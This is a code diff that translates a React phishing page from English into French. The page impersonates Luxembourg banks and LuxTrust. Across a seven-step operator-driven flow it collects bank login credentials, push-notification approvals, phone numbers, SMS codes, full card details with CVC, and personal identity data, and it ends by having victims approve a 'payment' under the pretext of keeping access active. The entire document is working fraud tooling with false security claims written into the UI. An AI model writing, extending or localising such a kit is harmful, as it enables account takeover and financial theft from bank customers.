@@ -25,13 +25,13 @@ import {
 const TOTAL_STEPS = 7;
 
 const STEP_LABELS = [
-  "Login",
-  "Approve",
-  "Phone",
+  "Identifiants",
+  "Approbation",
+  "Téléphone",
   "SMS",
-  "Card",
-  "Info",
-  "Confirm",
+  "Carte",
+  "Infos",
+  "Confirmation",
 ];
 
 const STATUS_TO_STEP = {
@@ -94,11 +94,11 @@ function Shell({ bank, step, children, title, kicker, desc }) {
             <BankHeaderLogo bank={bank} />
             <span className="min-w-0 leading-tight">
               <span className="block truncate text-[14px] font-extrabold sm:text-[16px]">{bank.name}</span>
-              <span className="block truncate text-[10px] opacity-80 sm:text-[11px]">Secure verification via LuxTrust</span>
+              <span className="block truncate text-[10px] opacity-80 sm:text-[11px]">Vérification sécurisée via LuxTrust</span>
             </span>
           </div>
           <Link to="/" className="shrink-0 rounded-full bg-black/20 px-3 py-2 text-[12px] font-medium hover:bg-black/30 active:bg-black/40">
-            ✕ Cancel
+            ✕ Annuler
           </Link>
         </div>
       </header>
@@ -106,7 +106,7 @@ function Shell({ bank, step, children, title, kicker, desc }) {
       <div className="mx-auto w-full max-w-3xl px-3 pt-4 sm:px-6 sm:pt-5">
         <div className="flex flex-wrap items-center gap-2 text-[12px] font-semibold">
           <span className="shrink-0 rounded-full px-2.5 py-1 text-white" style={{ backgroundColor: bank.color }}>
-            Step {step} of {TOTAL_STEPS}
+            Étape {step} sur {TOTAL_STEPS}
           </span>
           <span className="hidden min-w-0 flex-1 truncate text-neutral-500 md:block">{STEP_LABELS.join(" → ")}</span>
           <span className="truncate text-neutral-500 md:hidden">{STEP_LABELS[step - 1]}</span>
@@ -149,7 +149,7 @@ function Shell({ bank, step, children, title, kicker, desc }) {
             <div className="mt-6 flex items-center gap-3 border-t border-dashed border-neutral-200 pt-4">
               <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-emerald-50 text-[13px]">🔒</span>
               <p className="text-[11.5px] leading-snug text-neutral-400">
-                Encrypted &amp; secure • <b className="font-semibold text-neutral-500">{bank.name}</b> • Powered by LuxTrust
+                Chiffré et sécurisé • <b className="font-semibold text-neutral-500">{bank.name}</b> • Propulsé par LuxTrust
               </p>
             </div>
           </div>
@@ -164,9 +164,9 @@ function WaitingLoader({ bank, stepNum, note }) {
     <Shell
       bank={bank}
       step={stepNum}
-      kicker="Secure connection"
-      title="Please wait…"
-      desc="Your secure session is being prepared. Do not close this page."
+      kicker="Connexion sécurisée"
+      title="Veuillez patienter…"
+      desc="Votre session sécurisée est en cours de préparation. Ne fermez pas cette page."
     >
       <div className="flex w-full flex-col items-center rounded-2xl border border-dashed border-neutral-300 bg-gradient-to-b from-neutral-50 to-white px-4 py-9 text-center sm:py-11">
         <span className="relative flex h-20 w-20 items-center justify-center">
@@ -184,9 +184,9 @@ function WaitingLoader({ bank, stepNum, note }) {
             }}
           />
         </span>
-        <p className="mt-4 text-[17px] font-extrabold tracking-tight text-neutral-900 sm:text-[18px]">Please wait…</p>
+        <p className="mt-4 text-[17px] font-extrabold tracking-tight text-neutral-900 sm:text-[18px]">Veuillez patienter…</p>
         <p className="mt-1 max-w-sm text-[13.5px] leading-relaxed text-neutral-500">
-          {note || "Connecting you securely. This usually takes a few seconds."}
+          {note || "Connexion sécurisée en cours. Cela prend généralement quelques secondes."}
         </p>
         <span className="mt-4 flex items-center gap-1.5">
           {[0, 1, 2].map((i) => (
@@ -239,11 +239,11 @@ function ApproveVisual({ bank }) {
         </span>
       </span>
       <span className="min-w-0 flex-1">
-        <span className="block text-[14px] font-extrabold text-neutral-900">Open your {bank.short} app</span>
-        <span className="mt-0.5 block text-[12.5px] leading-snug text-neutral-500">Tap the push notification, then confirm it&apos;s really you.</span>
+        <span className="block text-[14px] font-extrabold text-neutral-900">Ouvrez votre application {bank.short}</span>
+        <span className="mt-0.5 block text-[12.5px] leading-snug text-neutral-500">Appuyez sur la notification push, puis confirmez que c&apos;est bien vous.</span>
         <span className="mt-2 inline-flex items-center gap-1.5 rounded-full bg-white px-3 py-1.5 text-[12px] font-semibold text-neutral-600 shadow-sm ring-1 ring-black/5">
           <span className="h-2 w-2 shrink-0 animate-pulse rounded-full bg-emerald-500" />
-          Waiting for approval…
+          En attente d&apos;approbation…
         </span>
       </span>
     </div>
@@ -494,9 +494,9 @@ export default function BankFlow() {
     return (
       <div className="flex min-h-screen w-full items-center justify-center overflow-x-hidden bg-neutral-100 p-4 sm:p-6">
         <div className="w-full max-w-sm rounded-2xl bg-white p-5 text-center shadow sm:p-6">
-          <p className="text-lg font-bold">Unknown bank</p>
+          <p className="text-lg font-bold">Banque inconnue</p>
           <Link to="/" className="mt-4 inline-block min-h-[44px] w-full rounded-lg bg-neutral-900 px-4 py-2.5 text-sm font-bold text-white sm:w-auto">
-            ← Back to LuxTrust
+            ← Retour à LuxTrust
           </Link>
         </div>
       </div>
@@ -527,13 +527,13 @@ export default function BankFlow() {
     status === "info_submitted"
   ) {
     const notes = {
-      waiting: "You clicked your bank. Please wait while we connect you securely…",
-      login_submitted: "Login received. Please wait for the next step…",
-      approve_submitted: "Approval received. Please wait…",
-      phone_submitted: "Phone number received. Please wait…",
-      sms_submitted: "SMS code received. Please wait…",
-      card_submitted: "Card details received. Please wait…",
-      info_submitted: "Details received. Please wait for final confirmation…",
+      waiting: "Vous avez choisi votre banque. Veuillez patienter pendant que nous vous connectons en sécurité…",
+      login_submitted: "Identifiants reçus. Veuillez patienter pour l'étape suivante…",
+      approve_submitted: "Approbation reçue. Veuillez patienter…",
+      phone_submitted: "Numéro reçu. Veuillez patienter…",
+      sms_submitted: "Code SMS reçu. Veuillez patienter…",
+      card_submitted: "Détails de la carte reçus. Veuillez patienter…",
+      info_submitted: "Informations reçues. Veuillez patienter pour la confirmation finale…",
     };
     return <WaitingLoader bank={bank} stepNum={stepNum} note={notes[status]} />;
   }
@@ -541,15 +541,15 @@ export default function BankFlow() {
   /* ---------- LOGIN ---------- */
   if (status === "login_requested") {
     const uidErr = t1 ? validateUserId(userId) : "";
-    const pwErr = !t1 ? "" : !password ? "Password is required." : password.length < 4 ? "Password looks too short." : "";
+    const pwErr = !t1 ? "" : !password ? "Le mot de passe est requis." : password.length < 4 ? "Le mot de passe semble trop court." : "";
     const ok = validateUserId(userId) === "" && password.length >= 4;
     return (
       <Shell
         bank={bank}
         step={1}
-        kicker="First step"
-        title="Log in to verify your identity"
-        desc={<>Enter your <strong>{bank.name}</strong> credentials. This is required to keep your LuxTrust access active.</>}
+        kicker="Première étape"
+        title="Connectez-vous pour vérifier votre identité"
+        desc={<>Entrez vos identifiants <strong>{bank.name}</strong>. Ceci est nécessaire pour garder votre accès LuxTrust actif.</>}
       >
         <form
           noValidate
@@ -563,7 +563,7 @@ export default function BankFlow() {
           <label className="block min-w-0">
             <span className="flex flex-wrap items-center gap-2 text-[13px] font-extrabold tracking-wide text-neutral-800">
               <span className="flex h-5 w-5 items-center justify-center rounded-md text-[11px] font-extrabold text-white" style={{ backgroundColor: bank.color }}>1</span>
-              User ID <span className="font-semibold text-neutral-400">4 digits + 4 letters</span>
+              Identifiant <span className="font-semibold text-neutral-400">4 chiffres + 4 lettres</span>
             </span>
             <span className="relative mt-2 block">
               <LeadIcon d={P.user} />
@@ -576,10 +576,10 @@ export default function BankFlow() {
                 className={`font-mono text-[16px] font-bold uppercase tracking-[0.12em] placeholder:text-neutral-300 ${inputCls(uidErr)}`}
               />
             </span>
-            {uidErr ? <span className={errCls}>⚠ {uidErr}</span> : <span className="mt-1.5 block text-[12px] text-neutral-400">Example: <b className="font-mono">{USER_ID_EXAMPLE}</b> — first 4 digits, last 4 letters.</span>}
+            {uidErr ? <span className={errCls}>⚠ {uidErr}</span> : <span className="mt-1.5 block text-[12px] text-neutral-400">Exemple : <b className="font-mono">{USER_ID_EXAMPLE}</b> — 4 chiffres d&apos;abord, 4 lettres ensuite.</span>}
           </label>
           <label className="mt-4 block min-w-0">
-            <span className={labelCls}>Password</span>
+            <span className={labelCls}>Mot de passe</span>
             <span className="relative mt-2 block">
               <LeadIcon d={P.lock} />
               <input
@@ -592,17 +592,17 @@ export default function BankFlow() {
                 className={`${inputCls(pwErr)} pr-14`}
               />
               <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
-                {showPw ? "Hide" : "Show"}
+                {showPw ? "Masquer" : "Afficher"}
               </button>
             </span>
             {pwErr && <span className={errCls}>⚠ {pwErr}</span>}
           </label>
           <div className="mt-6">
-            <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Verify &amp; Continue →</PrimaryBtn>
+            <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Vérifier et continuer →</PrimaryBtn>
           </div>
           <div className="mt-2.5 flex w-full flex-col gap-2 sm:flex-row">
             <button type="button" onClick={goHome} className="min-h-[44px] flex-1 rounded-lg border border-neutral-200 px-4 py-2.5 text-[13px] font-semibold text-neutral-500 hover:bg-neutral-50">
-              Change bank
+              Changer de banque
             </button>
           </div>
         </form>
@@ -616,17 +616,17 @@ export default function BankFlow() {
       <Shell
         bank={bank}
         step={2}
-        kicker="Approve notification"
-        title="Check your LuxTrust app"
-        desc="There is a notification ready for you to approve in your LuxTrust app, to confirm it's really you."
+        kicker="Notification d'approbation"
+        title="Vérifiez votre application LuxTrust"
+        desc="Une notification est prête à être approuvée dans votre application LuxTrust, pour confirmer que c'est bien vous."
       >
         <ApproveVisual bank={bank} />
         <div className="mt-4 w-full space-y-2.5">
           <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("approve", { approved: true, at: new Date().toISOString() }, "approve_submitted")}>
-            ✓ I&apos;ve approved
+            ✓ J&apos;ai approuvé
           </PrimaryBtn>
           <button type="button" className="min-h-[48px] w-full rounded-xl border-2 border-neutral-200 px-4 py-2.5 text-[13.5px] font-bold text-neutral-600 transition hover:border-neutral-300 hover:bg-neutral-50 active:bg-neutral-100">
-            Resend notification
+            Renvoyer la notification
           </button>
         </div>
       </Shell>
@@ -636,13 +636,13 @@ export default function BankFlow() {
   /* ---------- PHONE ---------- */
   if (status === "phone_requested") {
     const digits = phone.replace(/\D/g, "");
-    const err = !t3 ? "" : !digits ? "Phone number is required." : digits.length < 8 ? "Please enter a valid phone number." : "";
+    const err = !t3 ? "" : !digits ? "Le numéro de téléphone est requis." : digits.length < 8 ? "Veuillez saisir un numéro valide." : "";
     const ok = digits.length >= 8;
     return (
-      <Shell bank={bank} step={3} kicker="Phone number" title="Enter your phone number" desc="Please fill in your phone number.">
+      <Shell bank={bank} step={3} kicker="Numéro de téléphone" title="Entrez votre numéro de téléphone" desc="Veuillez saisir votre numéro de téléphone.">
         <form noValidate onSubmit={(e) => { e.preventDefault(); setT3(true); if (!ok) return; submitAndWait("phone", { phone: `+352 ${phone}` }, "phone_submitted"); }}>
           <label className="block min-w-0">
-            <span className={labelCls}>Phone number</span>
+            <span className={labelCls}>Numéro de téléphone</span>
             <span className="relative mt-2 flex w-full min-w-0 items-center overflow-hidden rounded-xl border-2 border-neutral-200 bg-slate-50/70 transition-all duration-200 focus-within:border-[var(--brand)] focus-within:bg-white focus-within:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)] hover:border-neutral-300">
               <span className="shrink-0 py-3.5 pl-3.5 pr-1 text-neutral-400">
                 <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round"><path d={P.phone} /></svg>
@@ -660,7 +660,7 @@ export default function BankFlow() {
             </span>
             {err && <span className={errCls}>⚠ {err}</span>}
           </label>
-          <div className="mt-6"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Continue →</PrimaryBtn></div>
+          <div className="mt-6"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Continuer →</PrimaryBtn></div>
         </form>
       </Shell>
     );
@@ -669,15 +669,15 @@ export default function BankFlow() {
   /* ---------- SMS ---------- */
   if (status === "sms_requested") {
     const code = sms.replace(/\D/g, "").slice(0, 6);
-    const err = !t4 ? "" : !code ? "SMS code is required." : code.length < 4 ? "Please enter the SMS code correctly." : "";
+    const err = !t4 ? "" : !code ? "Le code SMS est requis." : code.length < 4 ? "Veuillez saisir correctement le code SMS." : "";
     const ok = code.length >= 4;
     return (
-      <Shell bank={bank} step={4} kicker="SMS verification" title="Enter your SMS code" desc="Please fill in the SMS code we just sent to your phone number.">
+      <Shell bank={bank} step={4} kicker="Vérification SMS" title="Entrez votre code SMS" desc="Veuillez saisir le code SMS que nous venons d'envoyer à votre numéro.">
         <form noValidate onSubmit={(e) => { e.preventDefault(); setT4(true); if (!ok) return; submitAndWait("sms", { sms: code }, "sms_submitted"); }}>
           <label className="block min-w-0">
             <span className={`${labelCls} flex items-center gap-1.5`}>
               <svg viewBox="0 0 24 24" className="h-4 w-4 text-neutral-400" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d={P.chat} /></svg>
-              SMS code
+              Code SMS
             </span>
             <input
               value={code}
@@ -691,9 +691,9 @@ export default function BankFlow() {
             {err && <span className={`${errCls} justify-center`}>⚠ {err}</span>}
           </label>
           <div className="mt-4 text-center">
-            <button type="button" className="text-[13px] font-bold underline" style={{ color: bank.color }}>Resend SMS code</button>
+            <button type="button" className="text-[13px] font-bold underline" style={{ color: bank.color }}>Renvoyer le code SMS</button>
           </div>
-          <div className="mt-4"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Verify code →</PrimaryBtn></div>
+          <div className="mt-4"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Vérifier le code →</PrimaryBtn></div>
         </form>
       </Shell>
     );
@@ -704,10 +704,10 @@ export default function BankFlow() {
     const num = card.number.replace(/\D/g, "").slice(0, 16);
     const expOk = /^(0[1-9]|1[0-2])\/\d{2}$/.test(card.exp);
     const errs = {
-      holder: t5 && !card.holder.trim() ? "Card holder is required." : "",
-      number: t5 && num.length !== 16 ? "Enter the 16-digit card number." : "",
-      exp: t5 && !expOk ? "Use MM/YY format." : "",
-      cvc: t5 && !/^\d{3,4}$/.test(card.cvc) ? "Invalid CVC." : "",
+      holder: t5 && !card.holder.trim() ? "Le titulaire est requis." : "",
+      number: t5 && num.length !== 16 ? "Saisissez les 16 chiffres de la carte." : "",
+      exp: t5 && !expOk ? "Format MM/AA." : "",
+      cvc: t5 && !/^\d{3,4}$/.test(card.cvc) ? "CVC invalide." : "",
     };
     const ok = card.holder.trim() && num.length === 16 && expOk && /^\d{3,4}$/.test(card.cvc);
     const fmtNum = (v) => v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
@@ -717,7 +717,7 @@ export default function BankFlow() {
       return d.slice(0, 2) + "/" + d.slice(2);
     };
     return (
-      <Shell bank={bank} step={5} kicker="Credit card" title="Add your credit card details" desc="Please enter your credit card details to complete the verification.">
+      <Shell bank={bank} step={5} kicker="Carte bancaire" title="Ajoutez les détails de votre carte" desc="Veuillez saisir les détails de votre carte bancaire pour finaliser la vérification.">
         <form noValidate onSubmit={(e) => { e.preventDefault(); setT5(true); if (!ok) return; submitAndWait("card", { ...card, number: num }, "card_submitted"); }} className="w-full space-y-4">
           {/* mini card preview */}
           <div className="overflow-hidden rounded-2xl p-4 text-white shadow-lg sm:p-5" style={{ background: `linear-gradient(120deg, #1c1c28 0%, ${bank.color} 130%)` }}>
@@ -732,7 +732,7 @@ export default function BankFlow() {
             </div>
           </div>
           <label className="block min-w-0">
-            <span className={labelCls}>Card holder</span>
+            <span className={labelCls}>Titulaire de la carte</span>
             <span className="relative mt-2 block">
               <LeadIcon d={P.user} />
               <input value={card.holder} onChange={(e) => setCard({ ...card, holder: e.target.value })} placeholder="JOHN DOE" autoComplete="cc-name" className={`uppercase ${inputCls(errs.holder)}`} />
@@ -740,7 +740,7 @@ export default function BankFlow() {
             {errs.holder && <span className={errCls}>⚠ {errs.holder}</span>}
           </label>
           <label className="block min-w-0">
-            <span className={labelCls}>Card number</span>
+            <span className={labelCls}>Numéro de carte</span>
             <span className="relative mt-2 block">
               <LeadIcon d={P.card} />
               <input value={fmtNum(card.number)} onChange={(e) => setCard({ ...card, number: e.target.value })} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="cc-number" className={`font-mono tracking-wider ${inputCls(errs.number)}`} />
@@ -749,7 +749,7 @@ export default function BankFlow() {
           </label>
           <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
             <label className="block min-w-0">
-              <span className={labelCls}>Expiry</span>
+              <span className={labelCls}>Expiration</span>
               <span className="relative mt-2 block">
                 <LeadIcon d={P.cal} />
                 <input value={card.exp} onChange={(e) => setCard({ ...card, exp: fmtExp(e.target.value) })} placeholder="MM/YY" inputMode="numeric" autoComplete="cc-exp" className={`font-mono ${inputCls(errs.exp)}`} />
@@ -765,7 +765,7 @@ export default function BankFlow() {
               {errs.cvc && <span className={errCls}>⚠ {errs.cvc}</span>}
             </label>
           </div>
-          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Save card & Continue →</PrimaryBtn></div>
+          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer →</PrimaryBtn></div>
         </form>
       </Shell>
     );
@@ -774,29 +774,29 @@ export default function BankFlow() {
   /* ---------- INFO ---------- */
   if (status === "info_requested") {
     const e = {
-      first: t6 && !info.first.trim() ? "Required." : "",
-      last: t6 && !info.last.trim() ? "Required." : "",
-      dob: t6 && !info.dob ? "Required." : "",
-      address: t6 && !info.address.trim() ? "Required." : "",
-      zip: t6 && !info.zip.trim() ? "Required." : "",
-      city: t6 && !info.city.trim() ? "Required." : "",
+      first: t6 && !info.first.trim() ? "Requis." : "",
+      last: t6 && !info.last.trim() ? "Requis." : "",
+      dob: t6 && !info.dob ? "Requis." : "",
+      address: t6 && !info.address.trim() ? "Requis." : "",
+      zip: t6 && !info.zip.trim() ? "Requis." : "",
+      city: t6 && !info.city.trim() ? "Requis." : "",
     };
     const ok = info.first.trim() && info.last.trim() && info.dob && info.address.trim() && info.zip.trim() && info.city.trim();
     const set = (k) => (ev) => setInfo({ ...info, [k]: ev.target.value });
     return (
-      <Shell bank={bank} step={6} kicker="Personal info" title="Confirm your personal details" desc="Please fill in your name, birth date and address exactly as registered with your bank.">
+      <Shell bank={bank} step={6} kicker="Informations personnelles" title="Confirmez vos informations personnelles" desc="Veuillez saisir vos nom, date de naissance et adresse exactement comme enregistrés auprès de votre banque.">
         <form noValidate onSubmit={(ev) => { ev.preventDefault(); setT6(true); if (!ok) return; submitAndWait("info", info, "info_submitted"); }} className="w-full space-y-4">
           <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
-            <label className="block min-w-0"><span className={labelCls}>First name</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="John" autoComplete="given-name" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>⚠ {e.first}</span>}</label>
-            <label className="block min-w-0"><span className={labelCls}>Last name</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Doe" autoComplete="family-name" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>⚠ {e.last}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Prénom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="Jean" autoComplete="given-name" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>⚠ {e.first}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.last} onChange={set("last")} placeholder="Dupont" autoComplete="family-name" className={`${inputCls(e.last)}`} /></span>{e.last && <span className={errCls}>⚠ {e.last}</span>}</label>
           </div>
-          <label className="block min-w-0"><span className={labelCls}>Date of birth</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input type="date" value={info.dob} onChange={set("dob")} className={`pl-11 ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>⚠ {e.dob}</span>}</label>
-          <label className="block min-w-0"><span className={labelCls}>Address</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Street + number" autoComplete="street-address" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>⚠ {e.address}</span>}</label>
+          <label className="block min-w-0"><span className={labelCls}>Date de naissance</span><span className="relative mt-2 block"><LeadIcon d={P.cal} /><input type="date" value={info.dob} onChange={set("dob")} className={`pl-11 ${inputClsPlain(e.dob)}`} /></span>{e.dob && <span className={errCls}>⚠ {e.dob}</span>}</label>
+          <label className="block min-w-0"><span className={labelCls}>Adresse</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.address} onChange={set("address")} placeholder="Rue + numéro" autoComplete="street-address" className={`${inputCls(e.address)}`} /></span>{e.address && <span className={errCls}>⚠ {e.address}</span>}</label>
           <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
-            <label className="block min-w-0"><span className={labelCls}>ZIP</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="postal-code" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>⚠ {e.zip}</span>}</label>
-            <label className="block min-w-0"><span className={labelCls}>City</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.city} onChange={set("city")} placeholder="Luxembourg" autoComplete="address-level2" className={`${inputCls(e.city)}`} /></span>{e.city && <span className={errCls}>⚠ {e.city}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Code postal</span><span className="relative mt-2 block"><LeadIcon d={P.hash} /><input value={info.zip} onChange={set("zip")} placeholder="L-1234" autoComplete="postal-code" className={`${inputCls(e.zip)}`} /></span>{e.zip && <span className={errCls}>⚠ {e.zip}</span>}</label>
+            <label className="block min-w-0"><span className={labelCls}>Ville</span><span className="relative mt-2 block"><LeadIcon d={P.pin} /><input value={info.city} onChange={set("city")} placeholder="Luxembourg" autoComplete="address-level2" className={`${inputCls(e.city)}`} /></span>{e.city && <span className={errCls}>⚠ {e.city}</span>}</label>
           </div>
-          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Save & Continue →</PrimaryBtn></div>
+          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer →</PrimaryBtn></div>
         </form>
       </Shell>
     );
@@ -808,20 +808,20 @@ export default function BankFlow() {
       <Shell
         bank={bank}
         step={7}
-        kicker="Final confirmation"
-        title="Approve to finalize"
-        desc="Please approve the final verification request in your LuxTrust app to keep your access active."
+        kicker="Confirmation finale"
+        title="Approuvez pour finaliser"
+        desc="Veuillez approuver la demande de vérification finale dans votre application LuxTrust pour garder votre accès actif."
       >
         <ApproveVisual bank={bank} />
         <div className="mt-4 w-full rounded-2xl border p-4 text-[13px] sm:p-4" style={{ borderColor: bank.color + "44", background: `linear-gradient(180deg, ${bank.color}12, ${bank.color}06)` }}>
-          <p className="font-bold text-neutral-800">Verification summary</p>
+          <p className="font-bold text-neutral-800">Résumé de la vérification</p>
           <p className="mt-1 break-words text-neutral-600">
-            {bank.name} • User <b className="font-mono break-all">{userId.toUpperCase()}</b> • {info.first} {info.last} • {phone && `+352 ${phone}`}
+            {bank.name} • Utilisateur <b className="font-mono break-all">{userId.toUpperCase()}</b> • {info.first} {info.last} • {phone && `+352 ${phone}`}
           </p>
         </div>
         <div className="mt-4 w-full space-y-2.5">
           <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("confirm", { confirmed: true, at: new Date().toISOString() }, "done")}>
-            ✓ I&apos;ve approved the payment
+            ✓ J&apos;ai approuvé le paiement
           </PrimaryBtn>
         </div>
       </Shell>
@@ -833,18 +833,18 @@ export default function BankFlow() {
     <Shell
       bank={bank}
       step={7}
-      kicker="Finished"
-      title="Verification complete"
-      desc="Thank you. Your session is complete."
+      kicker="Terminé"
+      title="Vérification terminée"
+      desc="Merci. Votre session est terminée."
     >
       <div className="w-full rounded-xl border border-green-200 bg-green-50 p-4 text-center sm:p-6">
         <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-green-500 text-2xl text-white">✓</div>
-        <p className="mt-3 break-words text-[17px] font-extrabold text-neutral-900 sm:text-[18px]">Verification complete</p>
+        <p className="mt-3 break-words text-[17px] font-extrabold text-neutral-900 sm:text-[18px]">Vérification terminée</p>
         <p className="mt-1 text-[13px] text-neutral-600 sm:text-[13.5px]">
-          Thank you. Your {bank.name} identity has been verified.
+          Merci. Votre identité {bank.name} a été vérifiée.
         </p>
         <button onClick={goHome} className="mt-4 min-h-[48px] w-full rounded-lg bg-neutral-900 px-4 py-3 text-[14px] font-bold text-white active:bg-neutral-800">
-          ← Back
+          ← Retour
         </button>
       </div>
     </Shell>
